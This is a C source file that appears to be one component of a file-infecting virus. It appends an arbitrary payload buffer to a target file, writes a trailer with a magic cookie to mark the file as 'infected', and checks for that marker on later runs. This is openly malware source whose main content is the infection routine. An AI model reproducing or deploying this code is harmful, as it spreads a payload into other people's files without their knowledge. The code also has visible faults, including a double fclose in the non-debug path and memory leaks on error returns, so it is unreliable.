#include "config.h"

#include <stdio.h>
#include <stdlib.h>

#include "log.h"


typedef struct __attribute__ ((__packed__)) _trailer
{
    unsigned int magicNr;
    fpos_t myOffset;
    unsigned int *rlEntryPt;
} trailer_t;


static int appendTrailer(FILE *fp)
{
    trailer_t *trl = calloc(1, sizeof(trailer_t));

    if (trl == NULL) return (ERR_OMEM);
    trl->magicNr = MAGIC_COOKIE;
    trl->rlEntryPt = NULL;
    if (fseek(fp, 0L, SEEK_END) != 0) goto fail;
    fgetpos(fp, &(trl->myOffset));
#ifdef _SMSHR_DEBUG
    int sw;
    if ((sw = fwrite(trl, sizeof(trailer_t), 1, fp)) != 1)
    {
        PE("fwrite");
#else
    if (fwrite(trl, sizeof(trailer_t), 1, fp) != 1)
    {
#endif
        goto fail;
    }
    free(trl);
    return (ERR_OK);
fail:
    free(trl);
    return (ERR_FAIL);
}

static trailer_t * getTrailer(FILE *fp)
{
    trailer_t *trl = calloc(1, sizeof(trailer_t));

    if (trl == NULL)
    {
        return (NULL);
    }
    if (fseek(fp, -sizeof(trailer_t), SEEK_END) != 0)
    {
        E2("cant set pos in file stream")
        return (NULL);
    }
    if (feof(fp))
    {
        E2("EoF")
        return (NULL);
    }
#ifdef _SMSHR_DEBUG
    int sr;
    if ((sr = fread(trl, sizeof(trailer_t), 1, fp)) != 1)
    {
        if (ferror(fp))
        {
            PE("fread")
        }
        E("cant read trailer from file (got %d blocks; expected 1)", sr);
#else
    if (fread(trl, sizeof(trailer_t), 1, fp) != 1)
    {
        E2("cant read trailer from file")
#endif
        return (NULL);
    }
    if (trl->magicNr != MAGIC_COOKIE)
    {
        E("magicN mismatch; not infected (0x%08x != 0x%08x)", MAGIC_COOKIE, trl->magicNr)
        return (NULL);
    }
    return (trl);
}

static int appendBuf2Fp(char *buf, size_t siz, FILE *fp)
{
    if (fseek(fp, 0L, SEEK_END) != 0) return (ERR_FAIL);
    if (fwrite(buf, 1, siz, fp) < siz) return (ERR_FAIL);
    return (ERR_OK);
}

int infectFile(char *buf, size_t siz, char *target)
{
    FILE *fp;

    fp = fopen(target, "ab");
    if (!fp) return (ERR_FAIL);
    D("infecting file '%s'", target);
    if (appendBuf2Fp(buf, siz, fp) == ERR_OK)
    {
        if (appendTrailer(fp) == ERR_OK)
        {
            D("file '%s' infected (magicN: 0x%08x)", target, MAGIC_COOKIE)
        }
        else
        {
            E2("appendTrailer() failed")
            goto fail;
        }
    }
    else
    {
        E2("appendBuf2Fp() failed");
        goto fail;
    }
    fflush(fp);
    fclose(fp);
#ifdef _SMSHR_DEBUG
    fp = fopen(target, "rb");
    if (!fp) return (ERR_FAIL);
    trailer_t *trl;
    if ((trl = getTrailer(fp)) != NULL)
    {
        D2("file infection succeeded")
        D("mag: 0x%08x | myOffset: 0x%08x | rlEntryP: 0x%08x", trl->magicNr, trl->myOffset, trl->rlEntryPt)
    }
    else
    {
        E2("file infection failed")
    }
#endif // _SMSHR_DEBUG
    fclose(fp);
    return (ERR_OK);
fail:
    fclose(fp);
    return (ERR_FAIL);
}
